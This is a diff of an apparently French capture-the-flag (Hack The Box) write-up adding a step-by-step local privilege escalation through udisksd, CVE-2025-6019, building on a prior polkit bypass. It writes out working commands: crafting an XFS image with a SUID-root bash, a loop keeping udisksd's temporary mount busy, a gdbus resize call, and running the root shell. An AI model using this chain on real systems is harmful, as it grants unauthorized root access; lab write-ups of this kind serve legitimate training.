@@ -198,12 +198,12 @@ System Administrator
 ```
 
 Important:
-```
+```bash
 “SECURITY NOTICE — Unusual udisksd activity”
 ```
 
 Identifier udisksd et sa version:
-```
+```bash
 ps aux | grep udisksd
 busctl --system introspect org.freedesktop.UDisks2 /org/freedesktop/UDisks2/Manager
 systemctl status udisks2
@@ -273,13 +273,72 @@ Cette fois :
 Ça prouve que polkit nous considère comme **active local user**.
 
 Donc **CVE-2025-6018 est validée**.
-
 Ansi udisksctl devient utilisable sans mot de passe root
-On retente :
-```
-udisksctl loop-setup -f /tmp/disk.img
+
+### Exploitation de CVE-2025-6019 (XFS + SUID)
+
+Le but est de créer une image XFS contenant un binaire SUID root.
+Création de l’image XFS sur la machine attaquante:
+```bash
+dd if=/dev/zero of=xfs.image bs=1M count=300
+mkfs.xfs xfs.image
+
+mkdir mnt
+sudo mount -t xfs xfs.image mnt -o loop
+
+sudo cp /bin/bash mnt/bash
+sudo chown root:root mnt/bash
+sudo chmod 4755 mnt/bash
+
+sudo umount mnt
 ```
 
+Puis on l’envoie sur la machine HTB dans `/tmp/xfs.image`.
+```
+scp /tmp/xfs.image phileasfogg3@10.129.13.198:/tmp/xfs.image
+```
+
+On déclenche ensuite le montage vulnérable via udisksd:
+```
+udisksctl loop-setup -f /tmp/xfs.image
+```
+
+![[IMG-20260211171753275.png]]
+
+On  veut trigger le mount temporaire vulnérable via `Filesystem.Resize`
+Mais avant, pour exploiter CVE-2025-6019, on doit empêcher `udisksd` de démonter `/tmp/blockdev.XXXXXX`.
+
+Pour cela, on lance un processus en arrière-plan qui essaye continuellement d’exécuter le bash situé dans le mount temporaire dès qu’il apparaît :
+```
+killall -KILL gvfs-udisks2-volume-monitor 2>/dev/null || true
+
+while true; do
+  /tmp/blockdev*/bash -c 'sleep 10; ls -l /tmp/blockdev*/bash' && break
+done 2>/dev/null &
+```
+
+Cette boucle permet de “verrouiller” le mount temporaire dès qu’il est créé.
+Ainsi, lorsque l’opération de resize se termine, `udisksd` échoue à démonter le filesystem car il est encore utilisé.
+On peut ensuite executer la commande suivante:
+```
+gdbus call --system \
+  --dest org.freedesktop.UDisks2 \
+  --object-path /org/freedesktop/UDisks2/block_devices/loop0 \
+  --method org.freedesktop.UDisks2.Filesystem.Resize 0 '{}'
+```
+
+Cette commande sert à **forcer udisksd (qui tourne en root)** à effectuer une opération de **resize** sur le filesystem présent sur `/dev/loop0`.
+
+![[IMG-20260211173050740.png]]
+
+Cette erreur est **normale et volontaire** : elle confirme que le montage temporaire `/tmp/blockdev.XXXXXX` est toujours actif, car il est maintenu occupé par notre boucle en arrière-plan.
+
+On peut alors exécuter le binaire `bash` présent dans ce mount temporaire :
+```bash
+/tmp/blockdev.*/bash -p
+```
+
+![[IMG-20260211173625127.png]]
 
 
 ![[IMG-20260211144247163.png]]
